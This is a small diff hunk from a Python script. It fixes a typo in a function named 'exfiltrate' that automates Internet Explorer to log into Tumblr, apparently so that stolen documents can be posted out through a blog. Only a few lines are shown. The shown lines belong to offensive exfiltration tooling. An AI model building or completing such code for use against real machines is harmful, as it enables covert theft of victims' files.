@@ -134,7 +134,7 @@ def post_to_tumblr(ie, title, post):
 def exfiltrate(document_path):
 
     ie = win32com.client.Dispatch("InternetExplorer.Application")
-    ie.Visibile = 1
+    ie.Visible = 1
 
     # head to tumblr and login
     ie.Navigate("http://www.tumblr.com/login")
